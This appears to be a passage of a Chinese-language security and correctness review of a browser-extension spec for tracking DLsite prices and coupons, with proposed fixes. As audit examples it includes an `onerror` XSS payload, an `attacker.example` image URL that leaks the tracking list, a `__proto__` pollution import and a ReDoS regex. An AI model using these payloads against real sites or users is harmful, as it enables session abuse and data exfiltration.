# SPEC.md v0.3 審查報告

> 審查對象：`SPEC.md` v0.3（2026-11-23，commit `c1d1edd`）
> 審查日期：2026-11-23
> 審查方式：只讀規格書，沒有開啟或登入 DLsite，沒有修改 `SPEC.md`。數字計算（§12.3 範例、複雜度、`limit_date` 換算、浮點捨去、時區解析）用 Node.js 實際算過；需要實際連線或實機測試才能確認的地方標為「未驗證」。

---

## 摘要

| 嚴重度 | 安全 | 正確性 | 可行性 | 合計 |
|---|---|---|---|---|
| 高 | 3 | 1 | 0 | **4** |
| 中 | 5 | 8 | 4 | **17** |
| 低 | 4 | 3 | 5 | **12** |
| 合計 | 12 | 12 | 9 | **33** |

**最重要的 5 項修正**

1. **§12.2 的 `g[mask]` 只能用可重複使用的券**（C-1，高）。目前 `best(S) = max_c save(c, S)` 沒有排除一次性券，照字面實作會讓一次性券在 `g` 裡被用好幾次，試算結果比實際能省的多。
2. **「不用 `innerHTML`」不夠，要改成「外部資料只當純文字；URL 一律由程式自己組」**（S-1、S-2，高）。`condition_info` 去 HTML 時若用「建一個沒插入頁面的 `div` 再設 `innerHTML`」，`<img onerror>` 照樣會在已登入的 DLsite 頁面執行；`href`／`src` 也不在 `textContent` 規則的保護範圍內。
3. **白名單要用唯一的 fetch 包裝函式在執行時強制，路徑要完全比對，並規定每個端點的 `credentials` 與 `redirect`**（S-3，高）。用前綴比對的話，`/home/mypage/coupon` 正好是 `/home/mypage/coupon/list/ajax` 的前綴；「只發 GET」也擋不住會改帳號狀態的 GET。
4. **DLsite 日期字串一律當 JST 解析，數字欄位不要用 `z.coerce`**（C-6、C-7，中）。在台灣時區直接 `new Date("2026-11-28 23:59:59")` 會差 1 小時（實測）；`z.coerce.number()` 會把 `null` 變成 0，讓 `maximum_applicable_price: null` 的券變成「所有作品都超過上限」。
5. **通知去重改成「狀態轉換才通知」，並修正 `lowest` 規則永遠成立的問題**（C-9，中），同時清掉跨章節矛盾（C-10，中）：§1.2 寫「不讀點數餘額以外的帳號資料」卻要讀券和購物車；§4／§8／M7 寫「解析優惠券頁面」，F14 卻是呼叫 API；券的張數 6／7 不一致。

---

## 一、安全

### S-1　`condition_info` 去 HTML 的方式沒有規定，常見寫法本身就是 XSS（高）

- **章節**：§3.2、§5.3 `Coupon.conditionText`、§5.4 `condition_info`
- **問題**：§5.3 只寫「`condition_info` 去掉 HTML 後的原文」，沒有規定怎麼去。最常見的寫法是：
  ```ts
  const div = document.createElement('div');
  div.innerHTML = html;          // ← 這一行就會出事
  return div.textContent;
  ```
  在 content script 裡，`div` 屬於 DLsite 的 `document`。即使 `div` 沒有插入頁面，`innerHTML` 建出來的 `<img src=x onerror=...>` 還是會去載入圖片並觸發 `onerror`，而且 inline handler 是在**頁面的 main world** 執行（受 DLsite 自己的 CSP 限制，DLsite 的 CSP 未驗證）。§3.2 的「不用 `innerHTML`」寫的是「外部資料插進頁面」，這個寫法沒有插進頁面，很容易被當成例外。
- **情境**：DLsite 的券說明是由營運人員或合作網站（例如 §10.2 的「黃遊宅之道」合作券）填寫的 HTML。只要其中一張券的 `condition_info` 被塞進 `<img src=x onerror="fetch('/home/mypage/...')">`（後台被入侵、合作方內容被竄改，或 DLsite 對這個欄位沒有過濾），使用者在任何 DLsite 頁面觸發 F14 同步時，就會在已登入狀態下執行對方的程式。
- **建議修正**（可貼進 §3.2）：
  > **HTML 欄位只轉成純文字，不保留任何 HTML。**
  > - `condition_info` 等含 HTML 的欄位，只在 content script 用 `new DOMParser().parseFromString(html, 'text/html')` 解析（`DOMParser` 產生的是惰性文件，不執行腳本、不載入圖片），取 `doc.body.textContent`，空白正規化並截斷到 2,000 字後存成 `conditionText`。原始 HTML 不儲存、不傳給 background。
  > - 禁止把任何外部字串指派給**屬於目前文件的元素**的 `innerHTML`、`outerHTML`、`insertAdjacentHTML`，即使元素還沒插入頁面；也禁止 `document.write`、`Range.createContextualFragment`、`dangerouslySetInnerHTML`。
  > - v1 不保留說明裡的 `<a href>` 連結，只顯示文字。
  > - ESLint 加上 `eslint-plugin-no-unsanitized` 與 `react/no-danger`，CI 失敗就不能合併。
  > - Service worker 沒有 `DOMParser`，所以去 HTML 一定在 content script 或擴充功能頁面做，不要搬到 background。

### S-2　`textContent` 規則沒有涵蓋 URL 屬性（`href`、`src`）（高）

- **章節**：§3.2、§5.1 `work_image`、§5.3 `TrackedItem.imageUrl`、F6、F8、F13
- **問題**：`textContent` 和 React 的預設跳脫只保護「文字節點」。外部資料一旦放進 `href`、`src`、`srcset`、`style`，跳脫就沒有作用：
  - `<a href={x}>`：`javascript:` 會執行程式。React 19 會擋 `javascript:` URL（版本行為未驗證），但 `data:`、`blob:`、其他網域、指向 §3.4 禁止路徑的網址都不會擋。
  - `<img src={x}>`：不會執行程式，但會對任意主機發請求，洩漏「這個使用者正在看哪個作品」與 IP；在 DLsite 頁面上也是對任意網址的 GET。
  - Chart.js 的自訂 HTML tooltip（`external` tooltip）常見寫法是 `innerHTML`，規格沒有提到。
- **情境**：DLWatcher（第三方）或 F10 匯入的 JSON 提供 `imageUrl: "https://attacker.example/t.gif?u=..."`，儀表板一打開就把追蹤清單逐筆回報給對方。或是某個欄位被當成連結：`href="https://www.dlsite.com/home/mypage/coupon"`，使用者一點就觸發領券（§5.4 已確認這個 GET 會改帳號狀態）。
- **建議修正**（可貼進 §3.2）：
  > **URL 一律由程式自己組，不使用外部資料提供的 URL。**
  > - 作品頁連結：只用 `https://www.dlsite.com/${site}/work/=/product_id/${id}.html` 組出，`site` 必須是列舉值（`maniax`、`home`、`books`、`pro`、`soft`…，實作前列完整），`id` 必須通過 `isWorkId()`（見 S-6）。
  > - 圖片：只接受 `https://img.dlsite.jp/` 開頭的網址；`//` 開頭的先補 `https:`；其他一律換成內建的預設圖。DLWatcher 和匯入檔案裡的圖片網址一律不用。
  > - 外部資料不准放進 `href`、`src`、`srcset`、`style`、`action`、`formaction`、`on*` 屬性。
  > - Chart.js 只用內建 canvas tooltip；如果要自訂 tooltip，用 React 元件渲染，不用 `innerHTML`。
  > - 擴充功能頁面的 CSP 在 MV3 預設值上再收緊（可行性未驗證，實作 M1 時確認）：
  >   `"extension_pages": "script-src 'self'; object-src 'self'; img-src 'self' https://img.dlsite.jp data:; connect-src 'self' https://www.dlsite.com https://dlwatcher.com"`
  >   `connect-src` 讓瀏覽器也擋住白名單以外的請求，作為 S-3 的第二道防線（service worker 是否同樣受這條 CSP 約束未驗證）。

### S-3　端點白名單只是「集中寫在一個檔案」，沒有在執行時強制（高）

- **章節**：§3.4、§8 `lib/api/endpoints.ts`
- **問題**：
  1. 「網址集中在 `endpoints.ts`」只是慣例。只要有人在別的檔案直接 `fetch()`，白名單就失效；code review 也看不出來。
  2. §3.4 的單元測試是「確認白名單裡**沒有** `/mypage/coupon`（不含 `/list`）」。這測的是清單內容，不是執行時行為。如果比對方式是 `url.startsWith(allowed)` 或 `pathname.includes(...)`，`/home/mypage/coupon` 正好是 `/home/mypage/coupon/list/ajax` 的前綴，方向一寫反就會放行領券端點。
  3. 「只發 GET」不等於安全：§5.4 已確認 DLsite 有會改帳號狀態的 GET；加入購物車的 `btn_cart` 也是連結（推測是 GET，未驗證）。真正的風險來自**帶 cookie 的請求**，規格沒有規定哪些請求可以帶 cookie。
  4. 沒有規定 `redirect` 行為。預設 `redirect: 'follow'` 時，白名單裡的網址被伺服器導向到別的路徑，fetch 會自動跟過去，白名單管不到。
- **情境**：日後加功能時，有人為了讀購物車在 `cart.ts` 寫了 `fetch('/home/cart?...')`，或寫了一個 `fetchDlsite(path)` 讓 content script 傳路徑進來。或是 DLsite 改版，把優惠券 API 導向到 `/home/mypage/coupon?from=list`，fetch 自動跟隨就變成領券。
- **建議修正**（可取代 §3.4 第 2、3 點）：
  > - 所有對外請求只能透過 `lib/api/endpoints.ts` 匯出的 `apiGet(key, params)`。其他檔案禁止直接用 `fetch`、`XMLHttpRequest`、`navigator.sendBeacon`、`EventSource`、`WebSocket`；ESLint 以 `no-restricted-globals`／`no-restricted-properties` 強制，只有 `endpoints.ts` 例外。
  > - `apiGet` 不接受外部傳入的 URL 或路徑，只接受端點代號與經過驗證的參數（作品編號要先通過 `isWorkId()`）。組出 URL 後，用 `new URL()` 解析並檢查 `origin` 與 `pathname` **完全相等**（DLWatcher 用 `^/product/(RJ|BJ|VJ)\d{6}(\d{2})?\.json$` 整段比對），不符就丟例外。
  > - 每個端點固定以下設定：
  >
  > | 代號 | 網址 | `credentials` | `redirect` | 可呼叫的地方 |
  > |---|---|---|---|---|
  > | `productInfo` | `https://www.dlsite.com/maniax/product/info/ajax` | `omit` | `error` | background、擴充功能頁面 |
  > | `couponList` | `https://www.dlsite.com/home/mypage/coupon/list/ajax` | `same-origin` | `manual` | **只有** content script |
  > | `dlwatcher` | `https://dlwatcher.com/product/{id}.json` | `omit` | `error` | background、擴充功能頁面 |
  >
  > - 全部請求加 `cache: 'no-store'`（`productInfo` 除外）與 `referrerPolicy: 'no-referrer'`。
  > - 只有 `couponList` 會帶 cookie。其他 DLsite 路徑（購物車、結帳、領券、帳號設定）一律不發請求；F2 購物車同步只讀**使用者自己打開的**購物車頁面 DOM，不 fetch 購物車。
  > - 單元測試改成測行為：對 `/home/mypage/coupon`、`/home/mypage/coupon?x=1`、`/home/mypage/coupon/`、`/home/cart`、`/home/buy`、`https://login.dlsite.com/` 呼叫內部的 `assertAllowed()`，每一個都要丟例外；白名單的筆數用快照測試鎖住，新增端點必須同時改測試。

### S-4　content script 的信任邊界沒有寫清楚（中）

- **章節**：§4、F1、F2、F12、F14
- **問題**：DLsite 頁面載入很多廣告與追蹤腳本。這些腳本不能直接呼叫 `chrome.runtime`（沒有設定 `externally_connectable.matches` 時網頁不能連線），但可以**操控 content script 讀到的東西**：
  - 對「カートに入れる」或我們自己注入的「查史低」「加入追蹤」按鈕呼叫 `.click()` 或 `dispatchEvent`，產生假的點擊。
  - 改寫按鈕的 `href`，或在購物車頁面塞入假的作品節點，讓 F1／F2 讀到任意作品編號。
  - 如果 content script 用 `window.postMessage` 或自訂 DOM 事件和頁面溝通，頁面腳本就能直接發假訊息。
  background 若把 content script 送來的訊息都當成可信，就變成「被頁面操控的代理人」。
- **情境**：被入侵的廣告腳本在購物車頁面插入 5,000 個 `RJxxxxxx` 節點，F2 把它們全部加入追蹤，接著 F4／F5 對 DLsite 和 DLWatcher 發出大量請求，觸發 §3.1 的退避甚至被封鎖；或是一直觸發「查史低」，把 DLWatcher 的請求額度耗光。
- **建議修正**（新增 §3.2 一節「訊息與事件」）：
  > - content script 只在 isolated world 執行，不注入 main world 腳本，不監聽 `window` 的 `message` 事件，不監聽、不派送自訂 DOM 事件，不讀取頁面的 JS 變數。
  > - 所有點擊處理都檢查 `event.isTrusted === true`，不是使用者真的點擊就忽略。
  > - background 的 `chrome.runtime.onMessage` 依來源分兩組：
  >   - 來自 content script（`sender.id === chrome.runtime.id`、`sender.origin === 'https://www.dlsite.com'`、`sender.frameId === 0`）只能送：`cartClicked {id}`、`cartSnapshot {ids}`、`lookup {id}`、`couponSyncResult {coupons}`、`shouldSyncCoupons`。
  >   - 來自擴充功能頁面（`sender.origin === new URL(chrome.runtime.getURL('')).origin`）才能送：匯入、匯出、刪除、改設定、試算等。
  >   - 其他來源一律忽略。每種訊息都用 zod 驗證，作品編號都要通過 `isWorkId()`。
  > - background 不提供「幫我抓這個網址」之類的通用訊息；content script 只送作品編號，網址由 background 自己組。
  > - 上限：一次 `cartSnapshot` 最多 200 個編號；追蹤清單總數上限 1,000 件；`lookup` 每分鐘最多 10 次；超過就忽略並記錄。
  > - 來自 content script 的優惠券資料，background 要再跑一次完整的 zod 驗證，不能因為「是自己的 content script 送的」就跳過。

### S-5　F10 匯入／匯出缺少大小、結構與原型污染的限制（中）

- **章節**：F10、§3.3
- **問題**：規格只寫「匯出成 JSON，可以匯入還原」和「券預設不匯出」。沒有規定：檔案大小上限、schema 驗證、哪些欄位可以匯入、怎麼合併。追蹤清單和快照是「以 id 為 key 的物件」（§5.3 `snapshots`），如果匯入時寫 `snapshots[item.id] = ...` 而 `id` 是 `"__proto__"`，就會改到該物件的原型；若用 `lodash.merge` 之類的深層合併，甚至會污染全域 `Object.prototype`。
- **情境**：網路上流傳一份「推薦作品清單.json」，裡面有 `{"id":"__proto__","title":{"isAdmin":true}}`、上萬筆項目、指向追蹤網站的 `imageUrl`，或偽造的優惠券。使用者匯入後，試算頁用假券算出不存在的折扣，或儀表板每次打開都對外回報。
- **建議修正**（可貼進 F10 說明或 §3.2）：
  > - 匯入檔上限 5 MB，超過直接拒絕；用 `file.text()` 讀取後 `JSON.parse`，再用 `.strict()` 的 zod schema 驗證整份檔案，任何一筆不符就整份拒絕並顯示錯誤位置。
  > - 匯出格式帶 `format: "dl-assistant-export"` 與 `version` 欄位，版本不認得就拒絕。
  > - 可以匯入的只有：追蹤清單（`id`、`targetPrice`、`paused`、`addedAt`）與自己的查價紀錄。`id` 必須通過 `isWorkId()`；字串欄位有長度上限（標題 300 字）；數字有範圍（價格 0～1,000,000 的整數）。
  > - **不匯入**：`title`、`imageUrl`（下次查價時從 API 重新取得）、設定、通知紀錄、**優惠券**。優惠券只能來自 F14 同步，避免假券影響試算。
  > - 用 `Map` 或 `Object.create(null)` 存放以 id 為 key 的資料；禁止用 `Object.assign` 或深層合併函式把匯入資料併入既有物件。
  > - 匯入前顯示摘要（新增幾件、覆蓋幾件），使用者確認後才寫入。
  > - 匯出時提醒「這份檔案包含你的追蹤清單（可能含 R18 作品）」；勾選匯出優惠券時，`encrypted_code` 本來就不存，所以也不會被匯出。

### S-6　右鍵選單信任 `linkUrl`；作品編號的 regex 沒有錨定（中）

- **章節**：F13、附錄（`/[VBR]J\d{6,8}/`）
- **問題**：
  1. `contextMenus.onClicked` 的 `info.linkUrl` 是頁面上任意連結的網址，可能是 `javascript:`、別的網域，或是頁面腳本動態改過的網址。規格沒有說要怎麼從中取出作品編號，也沒有限制選單只出現在作品連結上。
  2. 附錄的 regex 沒有錨定、也沒有邊界：`RJ123456789` 會比對到 `RJ12345678`（截掉最後一碼）；`RJ1234567`（7 碼，不是合法編號）也會通過。同樣的 regex 若用在頁面文字或網址查詢參數，會抓到錯的作品。
- **情境**：列表頁上一則廣告連結是 `https://evil.example/?ref=RJ01014447`，右鍵查史低會把它當成那個作品；或是新格式的 9 碼編號被截斷，查到別的作品並加入追蹤。
- **建議修正**：
  > - 作品編號統一用 `isWorkId(s) = /^(RJ|RE|BJ|VJ)(\d{6}|\d{8})$/.test(s)`（前綴清單實作前在 §10 確認）。
  > - 從網址取編號：先 `new URL(linkUrl)`，要求 `protocol === 'https:'` 且 `host === 'www.dlsite.com'`，再用 `^/[a-z]+/(work|announce)/=/product_id/((?:RJ|RE|BJ|VJ)(?:\d{6}|\d{8}))(?:\.html)?(?:/|$)` 比對 `pathname`，其他一律不處理。不用 regex 掃整段網址字串。
  > - `chrome.contextMenus.create` 設定 `contexts: ['link']`、`documentUrlPatterns: ['https://www.dlsite.com/*']`、`targetUrlPatterns: ['https://www.dlsite.com/*/work/=/product_id/*']`。
  > - 右鍵選單只查史低，不自動加入追蹤，也絕不 fetch `linkUrl` 本身。

### S-7　隱私：敏感欄位、原始回應、測試資料與送給 DLWatcher 的內容（中）

- **章節**：§3.3、§5.4 `encrypted_code`、§12.5
- **問題**：
  1. `encrypted_code` 寫「不儲存」，但沒有規定**不記錄**。開發時很容易 `console.log(rawResponse)` 或在錯誤訊息裡附上原始回應，擴充功能的 log 和錯誤回報就會含有這個欄位。
  2. §12.5 要用實測的券做 fixture，只寫「去掉個人資訊」。repo 已推到 GitHub（是否公開未驗證），fixture 一旦帶到 `encrypted_code` 或帳號相關資料就公開了。
  3. DLsite 頁面 HTML 裡有帳號 email（依任務背景說明）。如果 content script 用 `document.body.innerText` 加 regex 找價格或編號，就會讀到 email；這個字串只要被記錄、傳給 background 或存起來就是外洩。
  4. §3.3 說「送給 DLWatcher 的只有作品編號」。但對方還會看到：IP、請求時間（F12 臨時查詢是在使用者瀏覽的當下發出），以及 extension 發出的請求可能帶 `Origin: chrome-extension://<id>`（未驗證），等於能辨識「這是 DL_Assistant 的使用者」並知道他的追蹤清單。這不一定要改，但應該寫清楚。
- **建議修正**（可貼進 §3.3）：
  > - zod schema 只列出要用的欄位（預設會去掉未列出的欄位），`encrypted_code` 不在 schema 裡。原始回應字串只存在於解析函式的區域變數，**不 log、不存、不放進錯誤訊息**；錯誤訊息只記錄「哪個欄位不符」與 HTTP 狀態碼。
  > - 測試 fixture 進 repo 前必須去掉：`encrypted_code`、任何帳號 ID、email、暱稱、領券時間以外的個人時間戳。另加一個測試掃描 `tests/fixtures/**`，含有 `encrypted_code` 或 `@` 加網域的字串就失敗。
  > - content script 只用 `selectors.ts` 裡的選擇器讀取特定元素，不讀 `document.body.innerText`／`outerHTML`，不把頁面文字整段送給 background。
  > - DLWatcher 會知道：你的 IP、查詢的作品編號與時間，可能也能辨識這是本擴充功能發出的請求。設定頁提供「關閉 DLWatcher」選項，關閉後只用自己的查價紀錄。

### S-8　content script 注入範圍與注入的 UI 沒有隔離規定（中）

- **章節**：§3.2、§7.1、F8、F12、F14
- **問題**：
  1. F14 要求「在任何 DLsite 頁面上」執行，content script 因此也會跑在結帳、付款、帳號設定頁。這些頁面不需要我們的功能，卻擴大了出錯和被利用的範圍。
  2. 注入到 DLsite 頁面的徽章、按鈕、結果小視窗，頁面上的所有腳本都讀得到、改得到（open shadow root 也一樣讀得到）。規格沒有規定哪些資料不能放進頁面 DOM。
  3. `host_permissions: https://www.dlsite.com/*` 讓 background 可以對 DLsite 任何路徑發帶 cookie 的請求。Chrome 對 `host_permissions` 的路徑部分是否生效未驗證（印象中會忽略路徑），所以權限本身縮不了，只能靠 S-3 的包裝函式。
- **情境**：廣告腳本讀取我們注入的「試算結果」或「你持有的券」元素，得知使用者持有哪些券、想買哪些作品（含 R18）。
- **建議修正**（可貼進 §3.2）：
  > - content script 的 `matches` 為 `https://www.dlsite.com/*`，另設 `exclude_matches` 排除結帳、付款、帳號設定相關路徑（實際路徑列入 §10 待確認）；`all_frames: false`；只在 isolated world 執行。
  > - 注入頁面的 UI 一律用 WXT 的 `createShadowRootUi`，`mode: 'closed'`（WXT 是否支援 closed 未驗證；不支援就用 open，並接受頁面讀得到的事實）。
  > - **頁面 DOM 裡只放公開資訊**：史低、價格走勢、「追蹤中」狀態。優惠券、試算結果、追蹤清單的其他作品，只在擴充功能自己的頁面（popup、儀表板、試算頁）顯示，不注入 DLsite 頁面。
  > - 擴充功能頁面一律不用 iframe 嵌進 DLsite 頁面。

### S-9　`externally_connectable` 與 `web_accessible_resources` 沒有鎖定（低）

- **章節**：§7.1
- **問題**：manifest 沒有宣告 `externally_connectable` 時，網頁不能連線，但**所有其他擴充功能都可以**對我們送訊息（Chrome 文件說明的預設行為）。目前規格沒有 `onMessageExternal`，所以實際風險低，但日後有人加上就會開洞。另外，WXT 或注入 UI 若需要把圖片、CSS 設為 `web_accessible_resources`，任何網站都能用它們來偵測使用者是否安裝本擴充功能。
- **建議修正**（可貼進 §7.1 manifest）：
  > ```json
  > "externally_connectable": { "ids": [], "matches": [] },
  > "web_accessible_resources": [
  >   { "resources": ["icons/*.png"], "matches": ["https://www.dlsite.com/*"], "use_dynamic_url": true }
  > ]
  > ```
  > 程式裡不註冊 `chrome.runtime.onMessageExternal`／`onConnectExternal`。`web_accessible_resources` 只列真的需要在 DLsite 頁面載入的檔案，沒有就整段省略。（空陣列寫法是否被 Chrome 接受未驗證，M1 時確認。）

### S-10　通知的文字與點擊目標（低）

- **章節**：§6、F6
- **問題**：`chrome.notifications` 只顯示純文字，不會執行 HTML，這部分安全。但：(1) 作品名稱來自 API，可以寫成「【DLsite 重要通知】您的帳號需要重新驗證」來冒充系統通知；(2) 規格說「點擊通知會開啟作品頁」，但合併成一則通知時（「3 個追蹤作品正在特價」）不知道該開哪個；(3) 如果開啟的網址取自 API 欄位，就回到 S-2 的問題。
- **建議修正**（可貼進 §6）：
  > - 通知標題固定為「DL_Assistant」加規則名稱（例如「DL_Assistant：特價」），作品名稱只放在內文，去掉控制字元並截斷到 60 字。
  > - `notificationId` 對應到背景存的 `{ ids: string[] }`。單一作品時開啟用 S-2 規則組出的作品頁網址；多件合併時開啟儀表板並篩選這幾件。
  > - 通知圖示一律用擴充功能內建圖示，不用作品縮圖（理由見 F-8）。

### S-11　MV3 CSP、建置與供應鏈（低）

- **章節**：§3.2、§7
- **問題**：
  1. zod 4 為了加速會用 `new Function` 產生驗證程式；MV3 擴充功能頁面禁止 `unsafe-eval`。zod 4 會偵測並退回不用 eval 的模式（細節未驗證），但可能在 console 留下 CSP 違規訊息。zod 3 沒有這個問題。
  2. WXT 開發模式為了熱重載會放寬 CSP、連到 localhost。如果不小心把 dev build 打包發佈，CSP 就不是規格寫的那樣。
  3. 依賴：WXT、React、Chart.js、date-fns adapter、zod、idb、Tailwind 加上它們的相依套件。供應鏈攻擊（被入侵的 npm 套件）是瀏覽器擴充功能的實際風險，規格只寫「不載入遠端腳本」。
- **建議修正**（可貼進 §7）：
  > - 若使用 zod 4，在程式進入點呼叫 `z.config({ jitless: true })`；或固定使用 zod 3。
  > - 發佈前檢查 `.output/chrome-mv3/manifest.json`：沒有 `localhost`、沒有 `unsafe-eval`、`content_security_policy` 與本規格一致。這一步寫成腳本放在 CI。
  > - `pnpm-lock.yaml` 進版控；CI 用 `pnpm install --frozen-lockfile`；維持 pnpm 10 預設的「不執行相依套件的 install script」，需要的套件才加進 `onlyBuiltDependencies`；每次升級套件跑 `pnpm audit`。
  > - 不使用任何從 CDN 或遠端載入程式碼的功能（包含 WXT 的 `url:` 遠端模組匯入）。
  > - 第二階段的 GitHub Actions 若要推播到 Discord／Telegram，webhook 網址存在 repo secrets，不寫進程式碼。

### S-12　其他濫用路徑：偽造徽章、點擊劫持、ReDoS、回應大小（低）

- **章節**：F8、F12、§3.6、§5.2
- **問題與情境**：
  1. **偽造徽章**：頁面腳本可以自己畫一個和我們長得一樣的「史低 ¥xxx」徽章，引導使用者以為現在是史低而購買。擴充功能無法阻止，但可以讓使用者知道真正的資料在哪裡。
  2. **點擊劫持**：頁面可以在我們的「加入追蹤」按鈕上蓋一層透明元素，或把按鈕放在誘導點擊的位置。影響小（最多多追蹤一件），但仍應避免。
  3. **ReDoS**：若用 regex 從頁面文字解析價格或日期，而且 regex 有巢狀量詞（例如 `(\d+,?)+円`），頁面上一段很長的特製文字就能讓 content script 卡住。
  4. **回應大小**：DLWatcher 回傳超大 JSON（例如 100 MB）會讓 service worker 記憶體爆掉。
- **建議修正**：
  > - 徽章上加一行「資料來源：DL_Assistant」與小圖示，點擊打開擴充功能自己的 popup／儀表板看完整資料；使用者教學說明「以擴充功能頁面為準」。
  > - 注入的按鈕只在使用者真的點擊（`isTrusted`）時動作；按鈕放在徽章容器內，不浮動、不覆蓋 DLsite 原本的元素。
  > - 解析頁面文字時：先用選擇器取到特定元素，再截斷到 200 字，再用沒有巢狀量詞的 regex；日期與價格的 regex 放在 `selectors.ts` 旁邊並附單元測試（含 10 萬字的惡意字串，限時 50 ms）。
  > - `apiGet` 讀取回應時檢查大小：DLWatcher 上限 2 MB、DLsite 商品 API 上限 5 MB、優惠券 API 上限 1 MB，超過就中止並當作失敗。
  > - zod 數字欄位都加範圍：價格為 0～1,000,000 的整數，折扣率 0～100，定額券面額 1～100,000。

---

## 二、正確性

### C-1　`g[mask]` 沒有排除一次性券，會重複使用同一張限次券（高）

- **章節**：§12.2 第 1～3 步
- **問題**：第 1 步定義 `best(S) = max_c save(c, S)`，`c` 的範圍是「所有券」。第 2 步的 `g[mask]` 用 `best(sub)`，第 3 步以 `f[0] = g` 為基礎再疊加限次券。如果 `best` 包含限次券，`g` 會在多個訂單裡各用一次同一張限次券，而 `f` 只會更大，不會修正回來。第 2 步的標題是「只有可重複使用的券時」，但第 3 步又說「在 `g` 的基礎上」，實作的人很容易直接重用同一個 `best`。
- **反例**：作品 p1 ¥1,200、p2 ¥1,200；只有一張一次性的 `payment` 券「¥400，滿 ¥1,200」（§10.2 實測的那張）。
  - 若 `best` 含這張券：`g[{p1,p2}] = best({p1}) + best({p2}) = 400 + 400 = 800`，`f[1] ≥ g = 800`，試算顯示「省 ¥800」。
  - 實際上只能用一次，正確答案是 ¥400。
- **建議修正**（取代 §12.2 第 1～3 步的對應句子）：
  > 1. 券分成兩組：`R` = 可重複使用且沒有次數限制的券；`L` = 有次數限制或 `is_multiple_use: false` 的券。
  >    `bestR(S) = max(0, max_{c ∈ R} save(c, S))`（`0` 代表這一單不用券）。
  > 2. `g[0] = 0`；`g[mask] = max_{sub ⊆ mask，sub 含 mask 的最低位} ( bestR(sub) + g[mask \ sub] )`。**`g` 只用 `R` 裡的券。**
  > 3. 把 `L` 裡每張券依剩餘次數展開成 `min(uᵢ, n)` 張一次性的券 `l₁ … l_{k′}`。
  >    `f[0] = g`；`f[i][mask] = max( f[i-1][mask], max_{∅ ≠ sub ⊆ mask} ( f[i-1][mask \ sub] + save(lᵢ, sub) ) )`。答案是 `f[k′][全集]`。
  > 4. 先把 `save(c, sub)` 對所有 `c` 與 `sub` 預先算好存成 `Int32Array`（`(|R| + k′) × 2ⁿ`），DP 時直接查表。

  （`f` 的遞迴本身是對的：第 `i` 張一次性券要嘛不用，要嘛用在某個非空子集合 `sub`，剩下的交給前 `i-1` 張與 `R`。）

### C-2　「退化成逐件挑券」的捷徑與 n > 15 的貪婪法，對定額券和 `payment` 券不成立（中）

- **章節**：§12.2 第 2 步最後一段、第 4 步表格 `> 15` 列
- **問題**：「沒有門檻與件數條件時，每件作品各自挑最適合的券，再把同一張券的作品合成一單」只在**每件作品的折扣可以獨立加總**時成立，也就是只有折扣率券（`Σ floor(現價ᵢ × 折扣率)`）。定額券的折扣是 `min(面額, 小計)`，合在同一單反而會少折。
- **反例**：一張**可重複使用**、沒有門檻的定額券「¥400」；作品 p1 ¥300、p2 ¥300。
  - 捷徑：兩件都挑這張券 → 合成一單 → 折 `min(400, 600) = 400`，實付 ¥200。
  - 最佳：分兩單、各用一次 → 折 300 + 300 = 600，實付 ¥0。
  目前實測的定額券是一次性的，所以短期內不會遇到；但 §5.3 的資料模型允許 `kind: 'price'` 且 `multiUse: true`，演算法不能依賴「定額券剛好都是一次性」。
- **建議修正**：
  > - 捷徑只在「所有券都是 `kind: 'rate'`、`condition_type ≠ 'payment'`、`minSpend = 0`、`minItems ≤ 1`、而且都在 `R` 裡」時使用；否則一律跑 DP。
  > - n > 15 的近似解：先用捷徑處理折扣率券，再對每張定額券與 `payment` 券嘗試「單獨成一單」與「從其他單移入／移出一件」的局部交換，直到沒有改善；畫面標示「近似解」。測試時用 n ≤ 12 的隨機案例比較近似解與 DP 的差距，並把最大誤差寫進測試報告。

### C-3　排序條件（點數、到期、訂單數）無法用單一數字的 DP 表達；`payment` 券的「整單小計」沒有定義範圍（中）

- **章節**：§12.1 目標第 2～4 點、§12.2 第 1 步 `payment` 說明、§10.1 對設計的影響
- **問題**：
  1. §12.2 的 `g`／`f` 只最大化「省下的金額」。§12.1 要求金額相同時再比點數、券的到期時間、訂單數。DP 若只存一個數字，同分時留下哪個解是任意的，結果每次可能不同，也可能違反「訂單數最少」。§12.3 的範例就是例子（見 C-4 第 3 點）。
  2. `payment` 券寫「門檻和折抵都看 `S` 的整單小計」，但 §5.3 又寫 `payment` 型有 `siteIds`（`distribute_targets` 樓層）。如果某件作品不在這 15 個樓層裡，它算不算進「整單小計」？規格前後沒有交代。
- **建議修正**：
  > - DP 的值改成 tuple，依序比較：`(省下金額 ↑, 點數 ↑（只在勾選特定付款方式時）, 到期分數 ↑, 訂單數 ↓)`。四項都是可加總的：每一單的到期分數 = 所用券 `c` 的 `1 / (到期日 − 今天 + 1)`，不用券是 0；訂單數每一單 +1。`g`、`f` 的 `max` 都改成 tuple 的字典序比較。
  > - 不用券的作品，在 DP 結束後併入任一已存在的訂單（不影響折扣率券的金額；併入 `payment` 券的那一單時要重新檢查不超過面額也不改變結果），以符合「訂單數最少」。
  > - `payment` 券：門檻與折抵上限只計算**屬於 `distribute_targets` 樓層的作品**的小計；不屬於的作品可以放在同一單，但不算進門檻。這一點列入 §10.2 待驗證（新增第 h 項）。

### C-4　§12.3 範例的前提互相矛盾，不符合自己的排序規則（中）

- **章節**：§12.3
- **我驗算過的部分**：各單金額都正確：3,520 × 30% = 1,056；1,650 × 20% = 330；2,200 × 15% = 330；小計合計 8,150；折扣合計 1,716；實付 6,434；件數 3 + 2 + 4 + 1 = 10；「只用 A」為 8,150 − 1,056 = 7,094。
- **問題**：
  1. C 是「全站 15%OFF（同人單價 ≤ ¥2,749）」，p10 只要 ¥780，卻寫「什麼券都不適用」。除非 p10 是 `noReduction`、正在打折而 C 不適用打折品，或不在 C 的樓層，否則矛盾。
  2. 比較列說「只用效果最好的一張券」是 A（¥7,094）。但如果 C 對 10 件都適用，單用 C 大約折 8,150 × 15% ≈ ¥1,222（逐件捨去後略少），比 A 的 ¥1,056 多，最好的一張應該是 C，金額約 ¥6,928。範例沒有說明 p1～p5 為什麼不能用 C。
  3. 範例分成 4 單，其中 #4 只有 p10 而且不用券。依 §12.1 第 4 點「訂單數最少」，p10 應該併入任一單（不影響金額），答案應該是 3 單。
  4. 排版：第 514～515 行有一個多出來的空表頭（含「獲得點數」欄），沒有內容。§12.2 有兩個「4.」。
- **建議修正**：
  > - 把 C 改成「全站 15%OFF，**不適用打折中的作品**（同人單價 ≤ ¥2,749）」，並寫明 A、B 適用打折中的作品，p1、p2、p4、p5、p7、p10 正在打折，所以只有 p3、p6、p8、p9 適用 C；p10 不適用 A、B（不是對象作品）也不適用 C（打折中）。
